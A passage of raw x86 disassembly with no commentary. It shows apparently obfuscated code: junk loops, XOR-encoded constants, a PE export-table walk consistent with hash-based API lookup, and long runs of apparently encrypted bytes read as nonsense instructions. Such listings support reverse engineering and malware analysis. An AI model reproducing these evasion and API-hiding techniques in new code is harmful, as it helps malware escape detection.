  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [esi],esi
  40d123:	sbb    DWORD PTR [eax+0x7e81f9ea],esp
  40d129:	jle    0x40d14d
  40d12b:	jg     0x40d1ab
  40d12d:	jle    0x40d114
  40d12f:	jge    0x40d0b4
  40d131:	shr    BYTE PTR [edi],1
  40d133:	inc    ebp
  40d134:	(bad)  
  40d135:	sbb    al,0xc2
  40d137:	cmp    eax,0x39b659e6
  40d13c:	jne    0x40d140
  40d13e:	in     al,0x3d
  40d140:	sub    eax,0x13af28b3
  40d145:	mov    dl,cl
  40d147:	pop    eax
  40d148:	sub    DWORD PTR [eax+edi*2],ebx
  40d14b:	test   BYTE PTR [ebx-0x4918c0bc],al
  40d151:	repz sub al,0x41
  40d154:	xor    al,0xeb
  40d156:	push   eax
  40d157:	mov    ah,0xaa
  40d159:	test   DWORD PTR ds:0xbb665609,esi
  40d15f:	fistp  WORD PTR ds:0x45653c41
  40d165:	gs in  al,0x85
  40d168:	(bad)  
  40d169:	aam    0x46
  40d16b:	mov    al,0xa3
  40d16d:	mov    esi,0x70f599da
  40d172:	sub    eax,0x69851976
  40d177:	or     DWORD PTR [ebp+0xb],esp
  40d17a:	adc    ebx,DWORD PTR [eax+0x55]
  40d17d:	test   edx,esi
  40d17f:	sub    BYTE PTR [ecx+0x30],dh
  40d182:	cmp    eax,0xb87b2844
  40d187:	out    dx,eax
  40d188:	das    
  40d189:	hlt    
  40d18a:	clc    
  40d18b:	and    BYTE PTR ds:0x2dae0b14,al
  40d191:	rcl    DWORD PTR [ebx],cl
  40d193:	popf   
  40d194:	stc    
  40d195:	gs adc eax,0xc4667b25
  40d19b:	pop    ebp
  40d19c:	lds    ecx,FWORD PTR ds:0x82f598c5
  40d1a2:	xchg   esi,eax
  40d1a3:	cmp    edx,edi
  40d1a5:	cdq    
  40d1a6:	xor    DWORD PTR [eax],edi
  40d1a8:	push   esp
  40d1a9:	adc    eax,DWORD PTR [esp+esi*2+0x3]
  40d1ad:	add    bl,ah
  40d1af:	addr16 stc 
  40d1b1:	sti    
  40d1b2:	jle    0x40d231
  40d1b4:	(bad)  
  40d1b5:	pushf  
  40d1b6:	scas   al,BYTE PTR es:[edi]
  40d1b7:	jecxz  0x40d158
  40d1b9:	xor    eax,0x568ade0a
  40d1be:	and    BYTE PTR [ebx+0x50024ede],dl
  40d1c4:	pop    ss
  40d1c5:	cmp    esi,ebp
  40d1c7:	or     edx,DWORD PTR [ebx]
  40d1c9:	retf   0x641e
  40d1cc:	fdiv   QWORD PTR [ebp+0x37]
  40d1cf:	jp     0x40d210
  40d1d1:	or     ch,BYTE PTR [eax-0x7b]
  40d1d4:	out    dx,al
  40d1d5:	pop    es
  40d1d6:	sbb    al,0x7d
  40d1d8:	enter  0x58c5,0xbc
  40d1dc:	nop
  40d1dd:	xchg   edx,eax
  40d1de:	jne    0x40d21d
  40d1e0:	retf   
  40d1e1:	sub    al,0x1f
  40d1e3:	cld    
  40d1e4:	inc    eax
  40d1e5:	adc    ch,BYTE PTR [di-0x518f]
  40d1ea:	rol    BYTE PTR [edx+eiz*8+0x2eae49e1],cl
  40d1f1:	nop
  40d1f2:	ret    0xa34a
  40d1f5:	xor    eax,0xd443f63d
  40d1fa:	sti    
  40d1fb:	(bad)  
  40d1fc:	nop
  40d1fd:	inc    edi
  40d1fe:	(bad)  
  40d1ff:	sbb    DWORD PTR [ecx+0x46],edi
  40d202:	repnz mov ds:0x1cfe586,al
  40d208:	pop    esp
  40d209:	or     esp,DWORD PTR [ebx]
  40d20b:	pop    esp
  40d20c:	stos   DWORD PTR es:[edi],eax
  40d20d:	push   ss
  40d20e:	adc    al,ch
  40d210:	stc    
  40d211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d212:	outs   dx,DWORD PTR ds:[esi]
  40d213:	add    eax,0xd647359b
  40d218:	sbb    al,0x70
  40d21a:	lods   al,BYTE PTR ds:[esi]
  40d21b:	xor    BYTE PTR [eax],dh
  40d21d:	pop    ss
  40d21e:	push   esi
  40d21f:	outs   dx,BYTE PTR ds:[esi]
  40d220:	stc    
  40d221:	and    BYTE PTR [bp+di-0x7],al
  40d225:	jno    0x40d201
  40d227:	and    al,0xc0
  40d229:	mov    ebp,0xfeeb3bb5
  40d22e:	jmp    0x40d24d
  40d230:	outs   dx,DWORD PTR ds:[esi]
  40d231:	aaa    
  40d232:	popf   
  40d233:	ins    DWORD PTR es:[edi],dx
  40d234:	mov    edi,0xe4c5550d
  40d239:	int3   
  40d23a:	arpl   WORD PTR [ebp+esi*1+0x4c],si
  40d23e:	ds pop ebx
  40d240:	mov    edx,0xc92facb2
  40d245:	adc    eax,0xf57feefd
  40d24a:	ins    BYTE PTR es:[edi],dx
  40d24b:	push   ss
  40d24c:	addr16 mov edi,0xa627a634
  40d252:	cmp    al,0xe2
  40d254:	mov    sp,0x54c9
  40d258:	push   esp
  40d259:	adc    eax,DWORD PTR [ebx]
  40d25b:	retf   
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x426a8e30
  40d410:	es ret 0xad86
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d423
  40d41c:	inc    ecx
  40d41d:	pop    ecx
  40d41e:	jne    0x40d450
  40d420:	jmp    0x784e8cfb
  40d425:	test   al,0xbf
  40d427:	ret    
  40d428:	sub    ecx,DWORD PTR [eax-0x749b90ee]
  40d42e:	adc    ebp,ebp
  40d430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d431:	sbb    al,0xd1
  40d433:	lea    eax,[ebx-0x7]
  40d436:	enter  0x745f,0x3e
  40d43a:	pusha  
  40d43b:	stos   DWORD PTR es:[edi],eax
  40d43c:	jns    0x40d3cb
  40d43e:	mov    eax,ds:0x532cc1f9
  40d443:	or     ch,dl
  40d445:	inc    edi
  40d446:	pop    eax
  40d447:	and    al,0xc7
  40d449:	inc    ebp
  40d44a:	dec    esi
  40d44b:	inc    esi
  40d44c:	sbb    eax,0xec51c78f
  40d451:	mov    dh,0x4e
  40d453:	cmp    DWORD PTR [esi],ebx
  40d455:	inc    edx
  40d456:	push   ecx
  40d457:	mov    edi,0xb15c9a7a
  40d45c:	adc    al,0x4e
  40d45e:	and    eax,0x40714035
  40d463:	ret    0x73e2
  40d466:	sub    DWORD PTR [esi-0x5e555189],ebp
  40d46c:	fidivr WORD PTR [ebx+ecx*4-0x33]
  40d470:	loope  0x40d43d
  40d472:	enter  0x3a6a,0xf6
  40d476:	mov    esp,0xc6ee9c61
  40d47b:	cmp    edx,DWORD PTR [esi+ebx*4-0x42d13e3d]
  40d482:	jp     0x40d44d
  40d484:	pop    edi
  40d485:	mov    DWORD PTR [ebx-0x7a],esi
  40d488:	test   DWORD PTR [esi-0x56],ecx
  40d48b:	xchg   BYTE PTR [edx-0x5a],ah
  40d48e:	mov    esp,0xe234b744
  40d493:	popa   
  40d494:	adc    BYTE PTR [edi-0x4587ae1],dl
  40d49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d49b:	or     DWORD PTR [ecx],edx
  40d49d:	test   DWORD PTR ss:[si],0x8792d472
  40d4a5:	cmp    BYTE PTR [esi+0xa],cl
  40d4a8:	dec    esp
  40d4a9:	cs test al,0xce
  40d4ac:	icebp  
  40d4ad:	aad    0x2d
  40d4af:	fwait
  40d4b0:	idiv   ch
  40d4b2:	sub    eax,0x972290f5
  40d4b7:	hlt    
  40d4b8:	sbb    ebx,DWORD PTR ds:0x4f37b074
  40d4be:	shr    BYTE PTR [eax-0x6b],0x9a
  40d4c2:	xor    ch,BYTE PTR fs:[eax-0x2b03627b]
  40d4c9:	sub    eax,0x685d0ef3
  40d4ce:	pop    edi
  40d4cf:	shl    DWORD PTR [eax],1
  40d4d1:	adc    al,0xce
  40d4d3:	sbb    BYTE PTR [esi],ah
  40d4d5:	or     esi,ebp
  40d4d7:	jne    0x40d4cc
  40d4d9:	dec    edx
  40d4da:	jnp    0x40d4d3
  40d4dc:	mov    DWORD PTR [ecx-0xb],ebx
  40d4df:	into   
  40d4e0:	sbb    al,0xab
  40d4e2:	adc    eax,0x6b341923
  40d4e7:	xchg   esp,eax
  40d4e8:	inc    DWORD PTR [edx-0x83fcc58]
  40d4ee:	mov    ah,BYTE PTR [edx+0x29940c79]
  40d4f4:	pop    ss
  40d4f5:	ror    esi,cl
  40d4f7:	hlt    
  40d4f8:	add    bh,BYTE PTR [ecx+0x19]
  40d4fb:	jg     0x40d52e
  40d4fd:	aas    
  40d4fe:	cmp    BYTE PTR [ebx-0x23],cl
  40d501:	mov    al,ds:0x533dd08f
  40d506:	mov    ds:0x71ea9419,al
  40d50b:	sahf   
  40d50c:	cmp    edi,ecx
  40d50e:	stos   BYTE PTR es:[edi],al
  40d50f:	call   0xe8d5:0x96822749
  40d516:	dec    ebp
  40d517:	dec    esp
  40d518:	ret    0x52d4
  40d51b:	push   es
  40d51c:	and    BYTE PTR [edx+eax*8-0x6e],0x19
  40d521:	dec    esi
  40d522:	ds fst st(5)
  40d525:	mov    ch,BYTE PTR [edi+0xa]
  40d528:	mov    BYTE PTR [ebp+0x6d6c904c],cl
  40d52e:	jg     0x40d4b5
  40d530:	jl     0x40d5a5
  40d532:	out    0x1a,eax
  40d534:	inc    edi
  40d535:	or     eax,0x86437105
  40d53a:	dec    edx
  40d53b:	jno    0x40d5af
  40d53d:	in     eax,0x60
  40d53f:	xlat   BYTE PTR ds:[ebx]
  40d540:	cmc    
  40d541:	daa    
  40d542:	in     eax,dx
  40d543:	adc    dl,dh
  40d545:	popf   
  40d546:	mov    ebp,0xe80c75ff
  40d54b:	sbb    DWORD PTR [ecx-0x1],ebx
  40d54e:	dec    DWORD PTR [ebx+0x4d8bfc45]
  40d554:	clc    
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
